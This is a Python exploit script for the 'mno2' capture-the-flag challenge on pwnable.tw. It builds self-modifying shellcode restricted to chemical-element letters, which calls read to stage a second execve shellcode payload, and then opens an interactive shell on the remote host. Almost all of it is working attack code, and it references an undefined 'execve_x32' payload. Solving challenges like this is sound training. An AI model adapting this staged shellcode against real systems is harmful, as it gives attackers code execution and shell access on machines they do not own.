#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *

exe = context.binary = ELF('./mno2')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10301)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)                                                                                                                                                                                                                                                                                                               

gdbscript = '''
'''.format(**locals())
"""
#               : 3
Name            : read
eax             : 0x03
ebx             : unsigned int fd
ecx             : char *buf
edx             : size_t count
esi             : -
edi             : -
ebp             : -
Definition      : fs/read_write.c
"""

# -- Exploit goes here --
single_bytes = ['0x42', '0x43', '0x46', '0x48', '0x49', '0x4b',
                '0x4e', '0x4f', '0x50', '0x53',
                '0x55', '0x56', '0x57', '0x59']

elements = ["H", "He", "Li", "Be", "B", "C", "N", "O", "F", "Ne", "Na", "Mg", "Al", "Si", "P", "S", "Cl", "Ar", "K", "Ca", "Sc", "Ti", "V", "Cr", "Mn", "Fe", "Co", "Ni", "Cu", "Zn", "Ga", "Ge", "As", "Se", "Br", "Kr", "Rb", "Sr", "Y", "Zr", "Nb", "Mo", "Tc", "Ru", "Rh", "Pd", "Ag", "Cd", "In", "Sn", "Sb", "Te", "I", "Xe", "Cs", "Ba", "La", "Ce", "Pr", "Nd", "Pm", "Sm", "Eu", "Gd", "Tb", "Dy", "Ho", "Er", "Tm", "Yb", "Lu", "Hf", "Ta", "W", "Re", "Os", "Ir", "Pt", "Au", "Hg", "Tl", "Pb", "Bi", "Po", "At", "Rn", "Fr", "Ra", "Ac", "Th", "Pa", "U", "Np", "Pu", "Am", "Cm", "Bk", "Cf", "Es", "Fm", "Md", "No", "Lr", "Rf", "Db", "Sg", "Bh", "Hs", "Mt", "Ds", "Rg", "Cn", "Fl", "Lv"]

io = start()
shellcode = b"" # to call read on shellcode address to send a second stage of execve shellcode
shellcode += asm("pop ecx")*2 # pop ecx twice so now ecx points to the shellcode address
shellcode += b"FeZrFeZr" # pop edx twice to make edx a smaller value [0x7023]
shellcode += b"\x43\x43\x43\x43\x53\x53\x53\x53\x53" # push 0x3 many times to pop it into eax later >.<
shellcode += asm("dec ebx")*0x3 + b"\x53" # push 0x0 to pop it into ebx later
shellcode += asm("inc ebx")*0x58
shellcode += asm("dec ecx")
shellcode += asm("xor dword ptr [ecx + 0x56], ebx") # pop eax
shellcode += asm("dec ecx")
shellcode += asm("xor dword ptr [ecx + 0x56], ebx") # pop eax
shellcode += asm("dec ecx")
shellcode += asm("xor dword ptr [ecx + 0x56], ebx") # pop eax
shellcode += asm("inc ebx")*3
shellcode += asm("dec ecx")
shellcode += asm("xor dword ptr [ecx + 0x48], ebx") # pop ebx -> 0x5a
shellcode += asm("inc ebx")*(0x58-0x5e)
shellcode += asm("dec ecx")*1
shellcode += asm("xor dword ptr [ecx + 0x48], ebx") # JUNK
shellcode += asm("dec ebx")*1
shellcode += asm("dec ecx")
shellcode += asm("xor dword ptr [ecx + 0x49], ebx") # JUNK
shellcode += asm("inc ebx")*(0x80-0x5b+1)
shellcode += b"Ar\x59"*16 # padding
shellcode += asm("dec ecx")*2
shellcode += asm("xor dword ptr [ecx + 0x4f], ebx") # int 0x80 -> 80
shellcode += asm("inc ebx")*(0xcd-0x80)
shellcode += asm("dec ecx")
shellcode += asm("xor dword ptr [ecx + 0x4f], ebx") # int 0x80 -> cd 
shellcode = shellcode.ljust(400, b"C") # padding for no reason....

io.sendline(shellcode)
pause()
io.send(b"\x90"*512 + execve_x32)
io.interactive()